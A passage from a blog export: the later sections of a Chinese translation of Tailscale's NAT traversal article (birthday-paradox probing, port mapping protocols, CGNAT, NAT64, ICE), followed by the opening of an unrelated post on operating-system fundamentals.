地址确定了，剩下的就是端口了。总共有 65535 中可能，我们能遍历这个端口范围吗？\n如果发包速度是 100 packets/s，那最坏情况下，需要 10 分钟来找到正确的端口。 还是那句话，这虽然不是最优的，但总比连不上好。\n这很像是端口扫描（事实上，确实是），实际中可能会触发对方的网络入侵检测软件。\n7.2 基于生日悖论改进暴力扫描：hard side 多开端口 + easy side 随机探测 利用 birthday paradox 算法， 我们能对端口扫描进行改进。\n上一节的基本前提是：hard side 只打开一个端口，然后 easy side 暴力扫描 65535 个端口来寻找这个端口； 这里的改进是：在 hard size 开多个端口，例如 256 个（即同时打开 256 个 socket，目的地址都是 easy side 的 ip:port）， 然后 easy side 随机探测这边的端口。 这里省去算法的数学模型，如果你对实现干兴趣，可以看看我写的 python calculator。 计算过程是“经典”生日悖论的一个小变种。 下面是随着 easy side random probe 次数（假设 hard size 256 个端口）的变化，两边打开的端口有重合（即通信成功）的概率：\n随机探测次数 成功概率 174 50% 256 64% 1024 98% 2048 99.9% 根据以上结果，如果还是假设 100 ports/s 这样相当温和的探测速率，那 2 秒钟就有约 50% 的成功概率。 即使非常不走运，我们仍然能在 20s 时几乎 100% 穿透成功，而此时只探测了总端口空间的 4%。\n非常好！虽然这种 hard NAT 给我们带来了严重的穿透延迟，但最终结果仍然是成功的。 那么，如果是两个 hard NAT，我们还能处理吗？\n7.3 双 hard NAT 场景 这种情况下仍然可以用前面的 多端口+随机探测 方式，但成功概率要低很多了：\n每次通过一台 hard NAT 去探测对方的端口（目的端口）时，我们自己同时也生成了一个随机源端口， 这意味着我们的搜索空间变成了二维 {src port, dst port} 对，而不再是之前的一维 dst port 空间。 这里我们也不就具体计算展开，只告诉结果：仍然假设目的端打开 256 个端口，从源端发起 2048 次（20 秒）， 成功的概率是：0.01%。\n如果你之前学过生日悖论，就并不会对这个结果感到惊讶。理论上来说，\n要达到 99.9% 的成功率，我们需要两边各进行170,000 次探测 —— 如果还是以 100 packets/sec 的速度，就需要 28 分钟。 要达到 50% 的成功率，“只”需要 54,000 packets，也就是 9 分钟。 如果不使用生日悖论方式，而且暴力穷举，需要 1.2 年时间！ 对于某些应用来说，28 分钟可能仍然是一个可接受的时间。用半个小时暴力穿透 NAT 之后， 这个连接就可以一直用着 —— 除非 NAT 设备重启，那样就需要再次花半个小时穿透建个新连接。但对于 交互式应用来说，这样显然是不可接受的。\n更糟糕的是，如果去看常见的办公网路由器，你会震惊于它的 active session low limit 有多么低。 例如，一台 Juniper SRX 300 最多支持 64,000 active sessions。 也就是说，\n如果我们想创建一个成功的穿透连接，就会把它的整张 session 表打爆 （因为我们要暴力探测 65535 个端口，每次探测都是一条新连接记录）！ 这显然要求这台路由器能从容优雅地处理过载的情况。 这只是创建一条连接带来的影响！如果 20 台机器同时对这台路由器发起穿透呢？绝对的灾难！ 至此，我们通过这种方式穿透了比之前更难一些的网络拓扑。这是一个很大的成就，因为 家用路由器一般都是 easy NAT，hard NAT 一般都是办公网路由器或云 NAT 网关。 这意味着这种方式能帮我们解决\nhome-to-office（家-\u0026gt;办公室） home-to-cloud （家-\u0026gt;云） 的场景，以及一部分\noffice-to-cloud （办公室-\u0026gt;云） cloud-to-cloud （云-\u0026gt;办公室） 场景。\n7.4 控制端口映射（port mapping）过程：UPnP/NAT-PMP/PCP 协议 如果我们能让 NAT 设备的行为简单点，不要把事情搞这么复杂，那建 立连接（穿透）就会简单很多。真有这样的好事吗？还真有，有专门的一种协议叫 端口映射协议（port mapping protocols）。通过这种协议禁用掉前面 遇到的那些乱七八糟的东西之后，我们将得到一个非常简单的“请求-响应”。\n下面是三个具体的端口映射协议：\nUPnP IGD (Universal Plug’n’Play Internet Gateway Device)\n最老的端口控制协议， 诞生于 1990s 晚期，因此使用了很多上世纪 90 年代的技术 （XML、SOAP、multicast HTTP over UDP —— 对，HTTP over UDP ），而且很难准确和安全地实现这个协议。但以前很多路由器都内置了 UPnP 协议， 现在仍然很多。\n请求和响应：\n“你好，请将我的 lan-ip:port 转发到公网（WAN）”， “好的，我已经为你分配了一个公网映射 wan-ip:port ”。 NAT-PMP\nUPnP IGD 出来几年之后，Apple 推出了一个功能类似的协议，名为 NAT-PMP (NAT Port Mapping Protocol)。\n但与 UPnP 不同，这个协议只做端口转发，不管是在客户端还是服务端，实现起来都非常简单。\nPCP\n稍后一点，又出现了 NAT-PMP v2 版，并起了个新名字PCP (Port Control Protocol)。\n因此要更好地实现穿透，可以\n先判断本地的默认网关上是否启用了 UPnP IGD, NAT-PMP and PCP， 如果探测发现其中任何一种协议有响应，我们就申请一个公网端口映射，\n可以将这理解为一个加强版 STUN：我们不仅能发现自己的公网 ip:port，而且能指示我们的 NAT 设备对我们的通信对端友好一些 —— 但并不是为这个端口修改或添加防火墙规则。\n接下来，任何到达我们 NAT 设备的、地址是我们申请的端口的包，都会被设备转发到我们。 但我们不能假设这个协议一定可用：\n本地 NAT 设备可能不支持这个协议； 设备支持但默认禁用了，或者没人知道还有这么个功能，因此从来没开过； 安全策略要求关闭这个特性。\n这一点非常常见，因为 UPnP 协议曾曝出一些高危漏洞（后面都修复了，因此如果是较新的设备，可以安全地使用 UPnP —— 如果实现没问题）。 不幸的是，某些设备的配置中，UPnP, NAT-PMP，PCP 是放在一个开关里的（可能 统称为 “UPnP” 功能），一开全开，一关全关。因此如果有人担心 UPnP 的安全性，他连另 外两个也用不了。\n最后，终归来说，只要这种协议可用，就能有效地减少一次 NAT，大大方便建连过程。 但接下来看一些不常见的场景。\n7.5 多 NAT 协商（Negotiating numerous NATs） 目前为止，我们看到的客户端和服务端都各只有一个 NAT 设备。如果有多个 NAT 设备会 怎么样？例如下面这种拓扑：\n这个例子比较简单，不会给穿透带来太大问题。包从客户端 A 经过多次 NAT 到达公网的过程，与前面分析的穿过多层有状态防火墙是一样的：\n额外的这层（NAT 设备）对客户端和服务端来说都不可见，我们的穿 透技术也不关心中间到底经过了多少层设备。 真正有影响的其实只是最后一层设备，因为对端需要在这一层设备上 找到入口让包进来。 具体来说，真正有影响的是端口转发协议。\n客户端使用这种协议分配端口时，为我们分配端口的是最靠近客户端的这层 NAT 设备； 而我们期望的是让最离客户端最远的那层 NAT 来分配，否则我们得到的就是一个网络中间层分配的 ip:port，对端是用不了的； 不幸的是，这几种协议都不能递归地告诉我们下一层 NAT 设备是多少 —— 虽然可以用 traceroute 之类的工具来探测网络路径，再加上 猜路上的设备是不是 NAT 设备（尝试发送 NAT 请求） —— 但这个就看运气了。 这就是为什么互联网上充斥着大量的文章说 double-NAT 有多糟糕，以 及警告用户为保持后向兼容不要使用 double-NAT。但实际上，double-NAT 对于绝大部分 互联网应用来说都是不可见的（透明的），因为大部分应用并不需要主动地做这种 NAT 穿 透。\n但我也绝不是在建议你在自己的网络中设置 double-NAT。\n破坏了端口映射协议之后，某些视频游戏的多人（multiplayer）模式就会无法使用， 也可能会使你的 IPv6 网络无法派上用场，后者是不用 NAT 就能双向直连的一个好方案。 但如果 double-NAT 并不是你能控制的，那除了不能用到这种端口映射协议之外，其他大部分东西都是不受影响的。\ndouble-NAT 的故事到这里就结束了吗？—— 并没有，而且更大型的 double-NAT 场景将展现在我们面前。\n7.6 运营商级 NAT 带来的问题 即使用 NAT 来解决 IPv4 地址不够的问题，地址仍然是不够用的，ISP（互联网服务提供商） 显然 无法为每个家庭都分配一个公网 IP 地址。那怎么解决这个问题呢？ISP 的做法是不够了就再嵌套一层 NAT：\n家用路由器将你的客户端 SNAT 到一个 “intermediate” IP 然后发送到运营商网络， ISP’s network 中的 NAT 设备再将这些 intermediate IPs 映射到少量的公网 IP。 后面这种 NAT 就称为“运营商级 NAT”（carrier-grade NAT，或称电信级 NAT），缩写 CGNAT。如下图所示：\nCGNAT 对 NAT 穿透来说是一个大麻烦。\n在此之前，办公网用户要快速实现 NAT 穿透，只需在他们的路由器上手动设置端口映射就行了。 但有了 CGNAT 之后就不管用了，因为你无法控制运营商的 CGNAT！ 好消息是：这其实是 double-NAT 的一个小变种，因此前面介绍的解决方式大部分还仍然是适用的。 某些东西可能会无法按预期工作，但只要肯给 ISP 交钱，这些也都能解决。 除了 port mapping protocols，其他我们已经介绍的所有东西在 CGNAT 里都是适用的。\n新挑战：同一 CGNAT 侧直连，STUN 不可用 但我们确实遇到了一个新挑战：如何直连两个在同一 CGNAT 但不同家用路由器中的对端呢？如下图所示：\n在这种情况下，STUN 就无法正常工作了：STUN 看到的是客户端在公网（CGNAT 后面）看到的地址， 而我们想获得的是在 “middle network” 中的 ip:port，这才是对端真正需要的地址，\n解决方案：如果端口映射协议能用：一端做端口映射 怎么办呢？\n如果你想到了端口映射协议，那恭喜，答对了！如果 peer 中任何一个 NAT 支持端口映射协议， 对我们就能实现穿透，因为它分配的 ip:port 正是对端所需要的信息。\n这里讽刺的是：double-NAT（指 CGNAT）破坏了端口映射协议，但在这里又救了我们！ 当然，我们假设这些协议一定可用，因为 CGNAT ISP 倾向于在它们的家用路由器侧关闭 这些功能，已避免软件得到“错误的”结果，产生混淆。\n解决方案：如果端口映射协议不能用：NAT hairpin 模式 如果不走运，NAT 上没有端口映射功能怎么办？\n让我们回到基于 STUN 的技术，看会发生什么。两端在 CGNAT 的同一侧，假设 STUN 告诉我们 A 的地址是 2.2.2.2:1234，B 的地址是 2.2.2.2:5678。\n那么接下来的问题是：如果 A 向 2.2.2.2:5678 发包会怎么样？期望的 CGNAT 行为是：\n执行 A 的 NAT 映射规则，即对 2.2.2.2:1234 -\u0026gt; 2.2.2.2:5678 进行 SNAT。 注意到目的地址 2.2.2.2:5678 匹配到的是 B 的入向 NAT 映射，因此接着对这个包执行 DNAT，将目的 IP 改成 B 的私有地址。 通过 CGNAT 的 internal 接口（而不是 public 接口，对应公网）将包发给 B。 这种 NAT 行为有个专门的术语，叫 hairpinning（直译为发卡，意思 是像发卡一样，沿着一边上去，然后从另一边绕回来），\n大家应该猜到的一个事实是：不是所以 NAT 都支持 hairpin 模式。 实际上，大量 well-behaved NAT 设备都不支持 hairpin 模式，\n因为它们都有 “只有 src_ip 是私有地址且 dst_ip 是公网地址的包才会经过我” 之类的假设。 因此对于这种目的地址不是公网、需要让路由器把包再转回内网的包，它们会直接丢弃。 这些逻辑甚至是直接实现在路由芯片中的，因此除非升级硬件，否则单靠软件编程无法改变这种行为。 Hairpin 是所有 NAT 设备的特性（支持或不支持），并不是 CGNAT 独有的。\n在大部分情况下，这个特性对我们的 NAT 穿透目的来说都是无所谓的，因为我们期望中 两个 LAN NAT 设备会直接通信，不会再向上绕到它们的默认网关 CGNAT 来解决这个问题。\nHairpin 特性可有可无这件事有点遗憾，这可能也是为什么 hairpin 功能经常 broken 的原因。\n一旦必须涉及到 CGNAT，那 hairpinning 对连接性来说就至关重要了。\nHairpinning 使内网连接的行为与公网连接的行为完成一致，因此我们无需关心目的 地址类型，也不用知晓自己是否在一台 CGNAT 后面。\n如果 hairpinning 和 port mapping protocols 都不可用，那只能降级到中继模式了。\n7.7 全 IPv6 网络：理想之地，但并非问题全无 行文至此，一些读者可能已经对着屏幕咆哮：不要再用 IPv4 了！ 花这么多时间精力解决这些没意义的东西，还不如直接换成 IPv6！\n的确，之所以有这些乱七八糟的东西，就是因为 IPv4 地址不够了，我们一直在用越来越复杂的 NAT 来给 IPv4 续命。 如果 IP 地址够用，无需 NAT 就能让世界上的每个设备都有一个自己的公网 IP 地址，这些问题不就解决了吗？ 简单来说，是的，这也正是 IPv6 能做的事情。但是，也只说对了一半：在理想的全 IPv6 世界中，所有这些东西会变得更加简单，但我们面临的问题并不会完全消失 —— 因为有状态防火墙仍然还是存在的。\n办公室中的电脑可能有一个公网 IPv6 地址，但你们公司肯定会架设一个防火墙，只允许 你的电脑主动访问公网，而不允许反向主动建连。 其他设备上的防火墙也仍然存在，应用类似的规则。 因此，我们仍然会用到\n本文最开始介绍的防火墙穿透技术，以及 帮助我们获取自己的公网 ip:port 信息的旁路信道 仍然需要在某些场景下 fallback 到中继模式，例如 fallback 到最通用的 HTTP 中继 协议，以绕过某些网络禁止 outbound UDP 的问题。 但我们现在可以抛弃 STUN、生日悖论、端口映射协议、hairpin 等等东西了。 这是一个好消息！\n全球 IPv4/IPv6 部署现状 另一个更加严峻的现实问题是：当前并不是一个全 IPv6 世界。目前世界上\n大部分还是 IPv4， 大约 33% 是 IPv6，而且分布极度不均匀，因此某些 通信对所在的可能是 100% IPv6，也可能是 0%，或二者之间。 不幸的是，这意味着，IPv6 **还**无法作为我们的解决方案。 就目前来说，它只是我们的工具箱中的一个备选。对于某些 peer 来说，它简直是完美工 具，但对其他 peer 来说，它是用不了的。如果目标是“任何情况下都能穿透（连接） 成功”，那我们就仍然需要 IPv4+NAT 那些东西。\n新场景：NAT64/DNS64 IPv4/IPv6 共存也引出了一个新的场景：NAT64 设备。\n前面介绍的都是 NAT44 设备：它们将一个 IPv4 地址转换成另一 IPv4 地址。 NAT64 从名字可以看出，是将一个内侧 IPv6 地址转换成一个外侧 IPv4 地址。 利用 DNS64 设备，我们能将 IPv4 DNS 应答给 IPv6 网络，这样对终端来说，它看到的就是一个 全 IPv6 网络，而仍然能访问 IPv4 公网。\nIncidentally, you can extend this naming scheme indefinitely. There have been some experiments with NAT46; you could deploy NAT66 if you enjoy chaos; and some RFCs use NAT444 for carrier-grade NAT.\n如果需要处理 DNS 问题，那这种方式工作良好。例如，如果连接到 google.com，将这个域名解析成 IP 地址的过程会涉及到 DNS64 设备，它又会进一步 involve NAT64 设备，但后一步对用户来说是无感知的。\n但对于 NAT 和防火墙穿透来说，我们会关心每个具体的 IP 地址和端口。\n解决方案：CLAT (Customer-side transLATor) 如果设备支持 CLAT (Customer-side translator — from Customer XLAT)，那我们就很幸运：\nCLAT 假装操作系统有直接 IPv4 连接，而背后使用的是 NAT64，以对应用程序无感知。 在有 CLAT 的设备上，我们无需做任何特殊的事情。 CLAT 在移动设备上非常常见，但在桌面电脑、笔记本和服务器上非常少见， 因此在后者上，必须自己做 CLAT 做的事情：检测 NAT64+DNS64 的存在，然后正确地使用它们。 解决方案：CLAT 不存在时，手动穿透 NAT64 设备 首先检测是否存在 NAT64+DNS64。\n方法很简单：向 ipv4only.arpa. 发送一个 DNS 请求。这个域名会解析 到一个已知的、固定的 IPv4 地址，而且是纯 IPv4 地址。如果得到的 是一个 IPv6 地址，就可以判断有 DNS64 服务器做了转换，而它必然会用到 NAT64。这样 就能判断出 NAT64 的前缀是多少。\n此后，要向 IPv4 地址发包时，发送格式为{NAT64 prefix + IPv4 address} 的 IPv6 包。 类似地，收到来源格式为 {NAT64 prefix + IPv4 address} 的包时，就是 IPv4 流量。\n接下来，通过 NAT64 网络与 STUN 通信来获取自己在 NAT64 上的公网 ip:port，接 下来就回到经典的 NAT 穿透问题了 —— 除了需要多做一点点事情。\n幸运的是，如今的大部分 v6-only 网络都是移动运营商网络，而几乎所有手机都支持 CLAT。 运营 v6-only 网络的 ISPs 会在他们给你的路由器上部署 CLAT，因此最后你其实不需要做什么事情。 但如果想实现 100% 穿透，就需要解决这种边边角角的问题，即必须显式支持从 v6-only 网络连接 v4-only 对端。\n7.8 将所有解决方式集成到 ICE 协议 针对具体场景，该选择哪种穿透方式？ 至此，我们的 NAT 穿透之旅终于快结束了。我们已经覆盖了有状态防火墙、简单和高级 NAT、IPv4 和 IPv6。只要将以上解决方式都实现了，NAT 穿透的目的就达到了！\n但是，\n对于给定的 peer，如何判断改用哪种方式呢？ 如何判断这是一个简单有状态防火墙的场景，还是该用到生日悖论算法，还是需要手动处理 NAT64 呢？ 还是通信双方在一个 WiFi 网络下，连防火墙都没有，因此不需要任何操作呢？ 早期 NAT 穿透比较简单，能让我们精确判断出 peer 之间的路径特点，然后针对性地采用相应的解决方式。 但后面，网络工程师和 NAT 设备开发工程师引入了一些新理念，给路径判断造成很大困难。因此 我们需要简化客户端侧的思考（判断逻辑）。\n这就要提到 Interactive Connectivity Establishment (ICE，交换式连接建立) 协议了。 与 STUN/TURN 类似，ICE 来自电信领域，因此其 RFC 充满了 SIP、SDP、信令会话、拨号等等电话术语。 但如果忽略这些领域术语，我们会看到它描述了一个极其优雅的判断最佳连接路径的算法。\n真的？这个算法是：每种方法都试一遍，然后选择最佳的那个方法。就是这个算法，惊喜吗？\n来更深入地看一下这个算法。\nICE (Interactive Connectivity Establishment) 算法 这里的讨论不会严格遵循 ICE spec，因此如果是在自己实现一个可互操作的 ICE 客户端，应该通读RFC 8445, 根据它的描述来实现。这里忽略所有电信术语，只关注核心的算法逻辑， 并提供几个在 ICE 规范允许范围的灵活建议。\n为实现和某个 peer 的通信，首先需要确定我们自己用的（客户端侧）这个 socket 的地址， 这是一个列表，至少应该包括：\n我们自己的 IPv6 ip:ports 我们自己的 IPv4 LAN ip:ports（局域网地址） 通过 STUN 服务器获取到的我们自己的 IPv4 WAN ip:ports（公网地址，可能会经过 NAT64 转换） 通过端口映射协议获取到的我们自己的 IPv4 WAN ip:port（NAT 设备的端口映射协议分配的公网地址） 运营商提供给我们的 endpoints（例如，静态配置的端口转发） 通过旁路信道与 peer 互换这个列表。两边都拿到对方的列表后，就开始互相探测对方提供的地址。 列表中地址没有优先级，也就是说，如果对方给的了 15 个地址，那我们应该把这 15 个地址都探测一遍。\n这些探测包有两个目的：\n打开防火墙，穿透 NAT，也就是本文一直在介绍的内容； 健康检测。我们在不断交换（最好是已认证的）“ping/pong” 包，来检测某个特定的路径是不是端到端通的。 最后，一小会儿之后，从可用的备选地址中（根据某些条件）选择“最佳”的那个，任务完成！\n这个算法的优美之处在于：只要选择最佳线路（地址）的算法是正确的，那就总能获得最佳路径。\nICE 会预先对这些备选地址进行排序（通常：LAN \u0026gt; WAN \u0026gt; WAN+NAT），但用户也可以自己指定这个排序行为。 从 v0.100.0 开始，Tailscale 从原来的 hardcode 优先级切换成了根据 round-trip latency 的方式，它大部分情况下排序的结果和 LAN \u0026gt; WAN \u0026gt; WAN+NAT 是一致的。 但相比于静态排序，我们是动态计算每条路径应该属于哪个类别。 ICE spec 将协议组织为两个阶段：\n探测阶段 通信阶段 但不一定要严格遵循这两个步骤的顺序。在 Tailscale，\n我们发现更优的路径之后就会自动切换过去， 所有的连接都是先选择 DERP 模式（中继模式）。这意味着连接立即就能建立（优先级最低但 100% 能成功的模式），用户不用任何等待， 然后并行进行路径发现。通常几秒钟之后，我们就能发现一条更优路径，然后将现有连接透明升级（upgrade）过去。 但有一点需要关心：非对称路径。ICE 花了一些精力来保证通信双方选择的是相同的网络 路径，这样才能保证这条路径上有双向流量，能保持防火墙和 NAT 设备的连接一直处于 open 状态。 自己实现的话，其实并不需要花同样大的精力来实现这个保证，但需要确保你所有使用的所有路径上，都有双向流量。 这个目标就很简单了，只需要定期在所有已使用的路径上发 ping/pong 就行了。\n健壮性与降级 要实现健壮性，还需要检测当前已选择的路径是否已经失败了（例如，NAT 设备维护清掉了所有状态）， 如果失败了就要降级（downgrade）到其他路径。这里有两种方式：\n持续探测所有路径，维护一个降级时会用的备用地址列表； 直接降级到保底的中继模式，然后再通过路径探测升级到更好的路径。\n考虑到发生降级的概率是非常小的，因此这种方式可能是更经济的。\n7.9 安全 最后需要提到安全。\n本文的所有内容都假设：我们使用的上层协议已经有了自己的安全机制（ 例如 QUIC 协议有 TLS 证书，WireGuard 协议有自己的公钥）。 如果还没有安全机制，那显然是要立即补上的。一旦动态切换路径，基于 IP 的安全机制就是无用的了 （IP 协议最开始就没怎么考虑安全性），至少要有端到端的认证。\n严格来说，如果上层协议有安全机制，那即使收到是欺骗性的 ping/pong 流量，问题都不大， 最坏的情况也就是攻击者诱导两端通过他们的系统来中继流量。 而有了端到端安全机制，这并不是一个大问题（取决于你的威胁模型）。 但出于谨慎考虑，最好还是对路径发现的包也做认证和加密。具体如何做可以咨询你们的应用安全工程师。 8 结束语 我们终于完成了 NAT 穿透的目标！\n如果实现了以上提到的所有技术，你将得到一个业内领先的 NAT 穿透软件，能在绝大多数场景下实现端到端直连。 如果直连不了，还可以降级到保底的中继模式（对于长尾来说只能靠中继了）。\n但这些工作相当复杂！其中一些问题研究起来很有意思，但很难做到完全正确，尤其是那些 非常边边角角的场景，真正出现的概率极小，但解决它们所需花费的经历又极大。 不过，这种工作只需要做一次，一旦解决了，你就具备了某种超级能力： 探索令人激动的、相对还比较崭新的端到端应用（peer-to-peer applications）世界。\n8.1 跨公网 端到端直连 去中心化软件领域中的许多有趣想法，简化之后其实都变成了 跨过公网（互联网）实现端到端直连 这一问题，开始时可能觉得很简单，但真正做才 发现比想象中难多了。现在知道如何解决这个问题了，动手开做吧！\n8.2 结束语之 TL; DR 实现健壮的 NAT 穿透需要下列基础：\n一种基于 UDP 的协议； 能在程序内直接访问 socket； 有一个与 peer 通信的旁路信道； 若干 STUN 服务器； 一个保底用的中继网络（可选，但强烈推荐） 然后需要：\n遍历所有的 ip:port； 查询 STUN 服务器来获取自己的公网 ip:port 信息，以及判断自己这一侧的 NAT 的“难度”（difficulty）； 使用 port mapping 协议来获取更多的公网 ip:ports； 检查 NAT64，通过它获取自己的公网 ip:port； 将自己的所有公网 ip:ports 信息通过旁路信道与 peer 交换，以及某些加密秘钥来保证通信安全； 通过保底的中继方式与对方开始通信（可选，这样连接能快速建立） 如果有必要/想这么做，探测对方的提供的所有 ip:port，以及执行生日攻击（birthday attacks）来穿透 harder NAT； 发现更优路径之后，透明升级到该路径； 如果当前路径断了，降级到其他可用的路径； 确保所有东西都是加密的，并且有端到端认证。 «\u0026nbsp;[译] 写给工程师：关于证书（certificate）和公钥基础设施（PKI）的一切（SmallStep, 2018） [译] [论文] 可虚拟化第三代（计算机）架构的规范化条件（ACM, 1974）\u0026nbsp;» © 2016-2022 Arthur Chiao, Powered by Jekyll , Theme originated from Long Haul. Site visits: 576877, powered by busuanzi ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AF%91-nat-%E7%A9%BF%E9%80%8F%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%AE%9E%E8%B7%B5tailscale-2020-2022_6_17-09_18_37/","title":"[译] NAT 穿透是如何工作的：技术原理及企业级实践（Tailscale, 2020） (2022_6_17 09_18_37)"},{"content":"1.1 操作系统的基本概念 知识图谱 一、操作系统的概念 计算机系统自下而上大致可以分为四个部分：硬件、操作系统、应用程序和用户。\n操作系统（Operating System，OS）是指控制和管理整个计算机系统的硬件与软件资源，合理地组织、调度计算机的工作与资源的分配，进而为用户和其它软件提供方便接口与环境的程序集合。操作系统管理各种计算机硬件，为应用程序提供基础，并充当计算机硬件与用户之间的中介，是随着计算机研究和应用的发展逐步形成并发展起来的，它是计算机系统中最基本的系统软件。\n二、操作系统的特征 操作系统的基本特征包括并发、共享、虚拟和同步。\n1. 并发（Concurrence） 并发指两个或多个事件在同一时间间隔内发生。操作系统的并发性是指计算机系统中同时存在多个运行的程序，因此它具有处理和调度多个程序同时执行的能力。在操作系统中，引入进程的目的是使程序能够并发执行。\n注意并发（Concurrence）和并行（Parallelism）的区别：\n并发（Concurrence）：一个处理器同时处理多个任务，指的是逻辑上的同时发生； 并行（Parallelism）：多个处理器或者是多核的处理器同时处理多个不同的任务，指的是物理上的同时发生。 2. 共享（Sharing） 资源共享即共享，其指的是系统中的资源可供内存中多个并发执行的进程共同使用。共享可以分为互斥共享方式和同时共享方式。\n互斥共享方式 系统中的某些资源，例如打印机，虽然可以供多个并发执行的进程使用，但是为了避免这个进程打印一点那个进程打印一点这种资源使用混乱的情况，操作系统规定在一段时间内只允许一个进程访问该资源。这种共享资源的方式就是互斥共享，这种一段时间内只允许一个进程访问的资源被称为临界资源或者独占资源。\n在进程 A 访问临界资源时，必须先向操作系统提出访问请求，若此时该资源空闲，则操作系统将该资源分配给进程 A 使用，此后其它进程想要访问该资源就必须等待，直到进程 A 访问完毕并释放该资源后其它进程才能访问该资源。\n计算机系统中的大部分物理设备及某些软件中所用的栈、变量和表格都属于临界资源，它们都被要求互斥地共享。\n同时共享方式 计算机中的某个资源在在一段时间内可以同时允许多个进程访问，这种资源访问方式就称为同时共享。\n同时共享通常要求一个请求分为几个时间片段间隔的完成，即交替进行，“分时共享”。因此这里的“同时”指的是宏观上的，在微观上依然是交替进行的。只是由于 CPU 执行速度很快，我们感觉不到交替罢了。\n例如我们一边打游戏一边听歌的行为，游戏和音乐播放器是两个不同的进程，但是他们可以同时占用音频播放设备。因此我们才能够既听到音乐又听到游戏声音。\n并发和共享式操作系统两个最基本的特征，两者之间互为存在的条件：\n资源共享是以程序的并发为条件的，若系统不允许程序并发执行，则不会存在资源共享的问题； 若系统不能对资源共享实施有效的管理，则必将会影响到程序的并发执行。 3. 虚拟（Virtual） 虚拟是指把一个物理上的实体变为若干逻辑上的对应物体。物理实体是“实”的，是实际存在的；而对应物是“虚”的，是逻辑上构建出来的。用于实现虚拟的技术称为虚拟技术。\n操作系统中利用了多种虚拟技术来实现虚拟处理器、虚拟内存和虚拟外部设备等，包括现在使用的 Docker 和 K8S 同样是利用虚拟技术实现的。\n多道程序设计技术是在计算机内存中同时存放几道相互独立的程序，使它们在管理程序控制下，相互穿插运行，两个或两个以上程序在计算机系统中同处于开始到结束之间的状态, 这些程序共享计算机系统资源。与之相对应的是单道程序，即在计算机内存中只允许一个的程序运行。\n下面简单介绍以下几种虚拟技术：\n**虚拟处理器技术：**它是通过多道程序设计，采用让多道程序并发执行的方法，分时使用一个处理器。虽然只有一个物理处理器，但是能同时为多个用户使用，让每个终端用户都感觉到有一个 CPU 在为自己服务。利用多道程序设计技术把一个物理上的 CPU 虚拟为多个逻辑上的虚拟 CPU，称为虚拟处理器； 虚拟存储器技术：虚拟储存器技术可以把一台机器的物理存储器变为虚拟存储器，从而在逻辑上扩充物理存储器的容量。用户感觉到的存储器称之为虚拟存储器。例如电脑上安装了一个 8GB 的内存条，由于虚拟存储技术可以衍生出多个虚拟存储器，操作系统让每个进程都在虚拟存储器上运行，于是乎每个进程都感觉自己独占了 8GB 的内存，而实际上是他们共同使用那 8GB 的物理内存； 虚拟设备技术：将一台物理 I/O 设备虚拟为多台逻辑上的 I/O 设备，并允许每个用户占用一台逻辑上的 I/O 设备。使原来仅允许在一段时间由一个用户访问的临界资源变成了一段时间内允许多个用户访问的共享资源。 操作系统的虚拟技术可以归纳为：时分复用技术，如处理器的分时共享；空分复用技术，如虚拟存储器技术。\n4. 异步（Asynchronism） 多道程序环境允许多个程序并发执行，但是由于系统资源有限，进程的执行是走走停停的，它以不可预知的速度向前运行，这就是程序的异步性。\n只有操作系统拥有并发性才会拥有异步性。\n异步性使得操作系统运行在一种随机的环境下，可能会导致进程产生与时间有关的错误（例如对全局变量的访问不当会导致程序出现错误）。但是只要运行环境相同，操作系统必须保证运行结果相同。\n三、操作系统的目标和功能 为了给多道程序提供良好的运行环境，操作系统应当具有以下几个方面的功能：处理机管理、存储器管理、设备管理和文件管理；\n为了方便用户使用操作系统，还必须向用户提供接口。\n1. 计算机系统资源的管理者 （1）处理机管理 在多道程序环境下，处理机的分配和运行都以进程（或线程）为基本单位。因而对处理机的管理实际上为对进程的管理。\n进程管理主要包括：进程控制、进程同步、进程通信、死锁处理和处理机调度等。\n（2）存储器管理 存储器管理是为了给多道程序的运行提供良好的环境，方便用户使用及提高内存的利用率。\n存储器管理主要包括：内存分配、地址映射、内存保护与共享和内存扩充等。\n（3）文件管理 计算机中的信息都是以文件形式存在的，操作系统中负责文件管理的部分称为文件系统。\n文件管理主要包括：存储空间的管理、目录的管理以及文件读写管理和保护等。\n（4）设备管理 设备管理的主要任务是完成用户的 I/O 请求，方便用户使用各种设备并提高设备的利用率。\n设备管理主要包括：缓冲管理、设备分配、设备处理和虚拟设备等。\n2. 用户与计算机硬件系统之间的接口 为了方便用户使用计算机，操作系统还提供了用户接口。\n操作系统提供的接口主要分为两类：命令接口，用户使用命令接口来组织和控制作业的执行；程序接口，程序员使用程序接口来请求操作系统服务。\n（1）命令接口 使用命令接口进行作业控制的主要方式有两种：联机控制方式和脱机控制方式。按照控制方式可以将命令接口分为联机命令接口和脱机命令接口。\n联机命令接口 联机命令接口又称为交互式命令接口，适用于分时或者实时系统的接口。\n用户通过控制台或者终端输入操作命令。\n用户每输入一条命令，控制权就转交给操作系统的命令解释程序，然后由命令解释程序解释并执行输入的命令，等到完成功能后控制权再转交给用户。\n脱机命令接口 脱机命令接口又称为批处理命令接口，适用于批处理系统。\n它由一组作业控制命令组成。脱机用户不能直接干预程序的运行，而应事先用相应的作业控制命令写成一份作业操作说明书，连同作业一起提交给操作系统。系统调度到该作业时，由系统中的命令解释器逐步解释并执行作业操作说明书上的命令或者作业控制语句，从而间接的控制作业的运行。\n例如将下面的程序保存为 .bat 后缀的文本，在 Windows 系统下运行就可以批量创建文件夹。这个 xxx.bat 程序就是一个作业操作说明书，里面的代码就是批处理命令：\n1 md folder1 folder2 folder3 （2）程序接口 程序接口由一组系统调用命令（简称系统调用，也称广义接口）组成。\n用户通过在程序中使用这些系统调用命令来请求操作系统为其提供服务，如使用外部设备、进行磁盘操作等。\n当前最为流行的图形用户界面 GUI（Graphical User Interface，即图形接口）并不是操作系统的一部分，但是图形接口调用的系统调用命令是操作系统的一部分。\n3. 用作扩充器 